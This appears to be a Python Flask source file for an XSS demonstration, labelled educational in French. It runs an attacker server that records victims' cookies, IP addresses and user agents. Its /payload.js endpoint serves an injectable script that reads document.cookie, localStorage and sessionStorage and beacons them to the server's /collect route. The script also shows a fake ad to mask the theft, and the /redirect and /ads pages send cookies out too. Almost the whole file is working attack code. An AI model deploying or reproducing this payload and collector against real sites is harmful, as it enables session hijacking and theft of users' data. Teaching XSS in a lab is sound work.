from flask import Flask, request, jsonify, render_template_string
from datetime import datetime
import json
import os

app = Flask(__name__)

# Stockage des données "volées" (simulation)
stolen_data = []

# Template HTML pour la page malveillante
MALICIOUS_PAGE_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>🎯 Serveur Malveillant - Démonstration XSS</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(45deg, #ff6b6b, #ee5a24);
            color: white;
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: rgba(0,0,0,0.8);
            padding: 30px;
            border-radius: 15px;
        }
        .warning {
            background: #e74c3c;
            padding: 15px;
            border-radius: 10px;
            margin-bottom: 20px;
            text-align: center;
        }
        .data-item {
            background: rgba(255,255,255,0.1);
            margin: 10px 0;
            padding: 15px;
            border-radius: 8px;
        }
        .timestamp {
            color: #ffd700;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="warning">
            ⚠️ SERVEUR MALVEILLANT - DÉMONSTRATION ÉDUCATIVE ⚠️
            <br>Ce serveur simule la collecte de données par un attaquant
        </div>
        
        <h1>🕵️ Données Collectées via XSS</h1>
        <p>Total d'entrées collectées : <strong>{{ data_count }}</strong></p>
        
        {% for item in data_items %}
        <div class="data-item">
            <div class="timestamp">{{ item.timestamp }}</div>
            <strong>IP Source :</strong> {{ item.ip }}<br>
            <strong>User-Agent :</strong> {{ item.user_agent }}<br>
            <strong>Cookies :</strong> {{ item.cookies }}<br>
            <strong>URL d'origine :</strong> {{ item.referer }}<br>
            <strong>Données supplémentaires :</strong> {{ item.extra_data }}
        </div>
        {% endfor %}
        
        <div style="margin-top: 30px; text-align: center;">
            <button onclick="location.reload()" style="background:#28a745;color:white;border:none;padding:10px 20px;border-radius:5px;cursor:pointer;">
                Actualiser
            </button>
            <button onclick="clearData()" style="background:#dc3545;color:white;border:none;padding:10px 20px;border-radius:5px;cursor:pointer;margin-left:10px;">
                Vider les données
            </button>
        </div>
    </div>
    
    <script>
        function clearData() {
            if(confirm('Vider toutes les données collectées ?')) {
                fetch('/clear', {method: 'POST'})
                .then(() => location.reload());
            }
        }
        
        // Auto-refresh toutes les 5 secondes
        setTimeout(() => location.reload(), 5000);
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    """Page principale montrant les données collectées"""
    return render_template_string(
        MALICIOUS_PAGE_TEMPLATE,
        data_items=stolen_data[-20:],  # Afficher les 20 dernières entrées
        data_count=len(stolen_data)
    )

@app.route('/collect', methods=['POST', 'GET'])
def collect_data():
    """Endpoint pour collecter les données via XSS"""
    try:
        # Collecter les informations de la requête
        data_entry = {
            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'ip': request.remote_addr,
            'user_agent': request.headers.get('User-Agent', 'Unknown'),
            'referer': request.headers.get('Referer', 'Unknown'),
            'cookies': request.args.get('cookies', 'Aucun'),
            'extra_data': request.args.get('data', 'Aucune')
        }
        
        # Stocker les données
        stolen_data.append(data_entry)
        
        # Sauvegarder dans un fichier pour persistance
        with open('stolen_data.json', 'w') as f:
            json.dump(stolen_data, f, indent=2)
        
        print(f"[COLLECTE] Nouvelles données de {request.remote_addr}")
        print(f"  Cookies: {data_entry['cookies'][:100]}...")
        
        return jsonify({'status': 'success', 'message': 'Données collectées'})
    
    except Exception as e:
        print(f"[ERREUR] {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/redirect')
def malicious_redirect():
    """Page de redirection malveillante"""
    return """
    <html>
    <head>
        <title>Redirection Malveillante</title>
        <style>
            body { 
                font-family: Arial; 
                background: #2c3e50; 
                color: white; 
                text-align: center; 
                padding: 50px; 
            }
            .fake-offer {
                background: #e74c3c;
                padding: 30px;
                border-radius: 15px;
                margin: 20px auto;
                max-width: 400px;
            }
        </style>
    </head>
    <body>
        <div class="fake-offer">
            <h1>🎉 FÉLICITATIONS ! 🎉</h1>
            <p>Vous avez été redirigé par une attaque XSS !</p>
            <p>Cette page simule un site malveillant</p>
            <button onclick="history.back()" style="background:#3498db;color:white;border:none;padding:10px 20px;border-radius:5px;cursor:pointer;">
                Retour au site légitime
            </button>
        </div>
        
        <script>
            // Simulation de collecte de données sur la page malveillante
            setTimeout(() => {
                fetch('/collect?cookies=' + encodeURIComponent(document.cookie) + 
                      '&data=' + encodeURIComponent('Utilisateur redirigé avec succès'));
            }, 1000);
        </script>
    </body>
    </html>
    """

@app.route('/ads')
def fake_ads():
    """Page de fausses publicités"""
    return """
    <html>
    <head>
        <title>Publicités Malveillantes</title>
        <style>
            body { 
                font-family: Arial; 
                background: linear-gradient(45deg, #667eea, #764ba2); 
                margin: 0; 
                padding: 20px; 
            }
            .ad-container {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
                gap: 20px;
                max-width: 1200px;
                margin: 0 auto;
            }
            .fake-ad {
                background: white;
                padding: 20px;
                border-radius: 10px;
                text-align: center;
                box-shadow: 0 5px 15px rgba(0,0,0,0.3);
            }
        </style>
    </head>
    <body>
        <h1 style="text-align:center;color:white;">🎯 Publicités Injectées via XSS</h1>
        
        <div class="ad-container">
            <div class="fake-ad">
                <h3>💰 Offre Exclusive !</h3>
                <p>Gagnez 1000€ en 1 heure !</p>
                <button onclick="collectClick('offer1')">CLIQUER ICI</button>
            </div>
            
            <div class="fake-ad">
                <h3>🏆 Vous avez gagné !</h3>
                <p>iPhone 15 Pro gratuit !</p>
                <button onclick="collectClick('prize1')">RÉCLAMER</button>
            </div>
            
            <div class="fake-ad">
                <h3>⚡ Promotion Flash</h3>
                <p>70% de réduction sur tout !</p>
                <button onclick="collectClick('promo1')">PROFITER</button>
            </div>
        </div>
        
        <div style="text-align:center;margin-top:30px;">
            <button onclick="history.back()" style="background:#e74c3c;color:white;border:none;padding:15px 30px;border-radius:25px;cursor:pointer;">
                Retour au site sécurisé
            </button>
        </div>
        
        <script>
            function collectClick(adType) {
                alert('Clic sur publicité malveillante : ' + adType);
                fetch('/collect?data=' + encodeURIComponent('Clic sur pub: ' + adType));
            }
            
            // Collecte automatique des données de la page
            fetch('/collect?cookies=' + encodeURIComponent(document.cookie) + 
                  '&data=' + encodeURIComponent('Visite page publicités malveillantes'));
        </script>
    </body>
    </html>
    """

@app.route('/clear', methods=['POST'])
def clear_data():
    """Vider les données collectées"""
    global stolen_data
    stolen_data = []
    
    try:
        if os.path.exists('stolen_data.json'):
            os.remove('stolen_data.json')
    except:
        pass
    
    return jsonify({'status': 'success', 'message': 'Données vidées'})

# Payloads JavaScript à injecter dans l'application vulnérable
@app.route('/payload.js')
def get_payload():
    """Payload JavaScript pour injection XSS"""
    return """
// Payload XSS pour collecte de données
(function() {
    // Collecter les informations de la victime
    var victimData = {
        cookies: document.cookie,
        url: window.location.href,
        userAgent: navigator.userAgent,
        localStorage: JSON.stringify(localStorage),
        sessionStorage: JSON.stringify(sessionStorage)
    };
    
    // Envoyer les données au serveur malveillant
    var img = new Image();
    img.src = 'http://localhost:5001/collect?' + 
              'cookies=' + encodeURIComponent(victimData.cookies) +
              '&data=' + encodeURIComponent(JSON.stringify(victimData));
    
    // Afficher une fausse publicité pour masquer l'attaque
    var adDiv = document.createElement('div');
    adDiv.style.cssText = `
        position: fixed;
        top: 50px;
        right: 50px;
        width: 300px;
        height: 200px;
        background: linear-gradient(45deg, #ff6b6b, #ee5a24);
        color: white;
        padding: 20px;
        border-radius: 15px;
        z-index: 9999;
        text-align: center;
        box-shadow: 0 10px 30px rgba(0,0,0,0.5);
        font-family: Arial;
    `;
    adDiv.innerHTML = `
        <h3>🎯 Pub Injectée !</h3>
        <p>Cette publicité a été injectée via XSS</p>
        <p><small>Données collectées en arrière-plan</small></p>
        <button onclick="this.parentElement.remove()" 
                style="background:rgba(255,255,255,0.2);color:white;border:1px solid white;
                       padding:8px 15px;border-radius:20px;cursor:pointer;">
            Fermer
        </button>
    `;
    
    document.body.appendChild(adDiv);
})();
""", 200, {'Content-Type': 'application/javascript'}

if __name__ == '__main__':
    # Charger les données sauvegardées
    try:
        with open('stolen_data.json', 'r') as f:
            stolen_data = json.load(f)
    except:
        stolen_data = []
    
    print("🎯 Serveur malveillant démarré sur http://localhost:5001")
    print("⚠️  UNIQUEMENT À DES FINS ÉDUCATIVES ⚠️")
    print("\nEndpoints disponibles :")
    print("  GET  /          - Page principale (données collectées)")
    print("  POST /collect   - Collecte de données via XSS")
    print("  GET  /redirect  - Page de redirection malveillante") 
    print("  GET  /ads       - Fausses publicités")
    print("  GET  /payload.js - Payload JavaScript pour injection")
    
    app.run(host='0.0.0.0', port=5001, debug=True)